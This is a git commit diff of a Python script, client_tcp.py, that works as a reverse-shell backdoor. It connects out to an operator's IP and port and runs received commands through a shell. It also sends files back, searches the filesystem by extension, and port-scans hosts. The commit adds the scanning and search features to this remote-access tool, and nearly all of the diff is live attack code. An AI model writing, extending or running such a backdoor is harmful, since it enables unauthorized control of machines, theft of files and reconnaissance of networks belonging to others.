d6d5bcdb72ef0a6d97b942f09b5ae6663c5e3207
luffy27 <52876924+vivashu27@users.noreply.github.com>
2021-07-11 00:37:47 +0530

    Update client_tcp.py

--- client_tcp.py
+++ client_tcp.py
@@ -1,12 +1,8 @@
+#!/usr/bin/env python3
 import socket 
 import subprocess
 import os
 
-
-print("Using the script\n")
-print(">cd C:/user/\n")
-print(">grab file.txt\n")
-print(">terminate\n")
 
 def transfer(s,path):
     if os.path.exists(path):
@@ -18,10 +14,22 @@ def transfer(s,path):
         s.send('DONE'.encode())
     else:
         s.send('File not found'.encode())
+
+def scanner(s,ip,ports):
+    scan_res=''
+    for port in ports.split(","):
+        try:
+            sock=socket.socket()
+            out=sock.connect_ex((ip,int(port)))
+            if out==0:
+                scan_res=scan_res+"[+] Port "+port+" is open\n"
+        except Exception as err:
+            pass
+    s.send(scan_res.encode())
         
 def connect(ip,port):
     s=socket.socket()
-    s.connect((str(ip),int(port))
+    s.connect((ip,port))
     while True:
         command=s.recv(1024)
         if 'terminate'  in command.decode():
@@ -41,14 +49,31 @@ def connect(ip,port):
             except Exception as e:
                 s.send(("[-]"+str(e)).encode())
                 
+        elif 'search' in command.decode():
+            command=command[7:]
+            path,ext=command.decode().split("*")
+            lists=''
+            for dirpath,dirname,files in os.walk(path):
+                for file in files:
+                    if file.endswith(ext):
+                        lists=lists+'\n'+os.path.join(dirpath,file)
+            s.send(str(lists).encode())
+
+        elif 'scan' in command.decode():
+            command=command[5:]
+            ip,port=command.decode().split(":")
+            scanner(s,ip,port)
+            
         else:
             cmd=subprocess.Popen(command.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
             s.send(cmd.stdout.read())
             s.send(cmd.stderr.read())
         
 def main():
-    print("usage ./server.py <target ip addr> <port>\n")
-    connect(sys.argv[1],sys.argv[2])
+    try:
+        connect(str(argv[1]),int(argv[2]))
+    except Exception as e:
+        print("usage ./client.py <target ip addr> <port>\n")
     
 main()
             
